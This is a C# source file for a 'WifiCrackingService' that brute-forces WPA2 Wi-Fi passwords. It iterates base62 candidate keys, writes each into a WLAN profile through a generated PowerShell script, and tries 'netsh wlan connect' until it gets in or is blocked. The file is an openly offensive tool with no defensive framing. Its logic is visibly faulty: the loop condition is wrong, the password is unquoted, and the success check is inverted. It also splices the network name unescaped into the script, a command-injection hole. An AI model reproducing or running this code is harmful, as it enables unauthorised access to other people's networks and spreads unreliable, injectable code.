using System.Management.Automation;

namespace APinI.Services
{
    public class WifiCrackingService
    {
        private string _powerShellScribt ;
        private string _password;
        private string _name;

        public async Task<string> ProccessHacking(Wifi req)
        {
            var currentPassword = String.Empty;
            var iterator = new Base62Iterator("00000000");
            var isConnectionSuccess = false;
            var isConnectionBlocked = false;
            while(!isConnectionSuccess || !isConnectionBlocked)
            {
                currentPassword = iterator.Next();
                Console.Write(currentPassword);
                var connectionResult = await TryConnectToWifi(req,currentPassword);
                isConnectionSuccess = CheckIsConnectionSuccess(req,connectionResult);
                isConnectionBlocked = CheckIsConnectionBlocked(req,connectionResult);
            }

            return $"On Password:{currentPassword}, the connection is Success:{isConnectionSuccess} and is Blocked:{isConnectionBlocked}";
        }

        private bool CheckIsConnectionBlocked(Wifi req, List<string> connectionResult)
        {
            if(connectionResult.Contains("Could not connect to the network. The network may not be in range or the profile may not be correct.\r\n"))
                return true;
            return false;
        }

        private bool CheckIsConnectionSuccess(Wifi req, List<string> connectionResult)
        {
            if (connectionResult.Contains($"The network specified by profile \"{req.Name}\" is not available to connect."))
                return false;
            return true;
        }

        private async Task<List<string>> TryConnectToWifi(Wifi req, string currentPassword)
        {
            _password = currentPassword;
            _name = req.Name;
            var script = $"    " +
                $"$wifiName = \"{_name}\";\r\n    " +
                $"$wifiPassword = {_password};\r\n\r\n" +
                $"# Create a new WiFi profile using the provided SSID and password\r\n" +
                $"$profileXML = @\"\r\n<?xml version=\"1.0\"?>\r\n<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\r\n    " +
                $"<name>$wifiName</name>\r\n    " +
                $"<SSIDConfig>\r\n        " +
                $"<SSID>\r\n            " +
                $"<name>$wifiName</name>\r\n        " +
                $"</SSID>\r\n    " +
                $"</SSIDConfig>\r\n    " +
                $"<connectionType>ESS</connectionType>\r\n    " +
                $"<connectionMode>auto</connectionMode>\r\n    " +
                $"<MSM>\r\n        " +
                $"<security>\r\n            " +
                $"<authEncryption>\r\n                " +
                $"<authentication>WPA2PSK</authentication>\r\n                " +
                $"<encryption>AES</encryption>\r\n                " +
                $"<useOneX>false</useOneX>\r\n            " +
                $"</authEncryption>\r\n            " +
                $"<sharedKey>\r\n                " +
                $"<keyType>passPhrase</keyType>\r\n                " +
                $"<protected>false</protected>\r\n                " +
                $"<keyMaterial>$wifiPassword</keyMaterial>\r\n            " +
                $"</sharedKey>\r\n        " +
                $"</security>\r\n    " +
                $"</MSM>\r\n</WLANProfile>\r\n\"@\r\n\r\n" +
                $"# Save the profile XML to a temporary file\r\n" +
                $"$profilePath = [System.IO.Path]::GetTempFileName()\r\n" +
                $"$profileXML | Out-File -FilePath $profilePath -Encoding UTF8\r\n\r\n" +
                $"# Add the new WiFi profile to the system\r\nnetsh wlan add profile filename=\"$profilePath\"\r\n\r\n" +
                $"# Connect to the WiFi network\r\nnetsh wlan connect name=\"$wifiName\"\r\n\r\n" +
                $"# Clean up the temporary file\r\n" +
                $"Remove-Item -Path $profilePath";
            var powerShell = PowerShell.Create();
            powerShell.AddScript(script);
            powerShell.AddCommand("Out-String");
            var result = await powerShell.InvokeAsync();
            return GetPowerShellOutPutInListOfString(result).ToList();
        }

        private List<string> GetPowerShellOutPutInListOfString(PSDataCollection<PSObject> results)
        {
            Console.WriteLine($"{results.Select(result => result.BaseObject.ToString())}");
            var messagesBeforeFormating = results
                .Select(result => result.BaseObject.ToString())?
                .FirstOrDefault()?
                .Split("\n")
                .ToList();
            var messagesAfterFormating = new List<string>();
            messagesBeforeFormating?.ForEach(message => messagesAfterFormating.Add(message.Replace("\r", "")));

            return messagesAfterFormating ?? new List<string>();
        }
    }

    public class Wifi
    {
        public string Name { get; set; }
        public string Password { get; set; }
    }
}
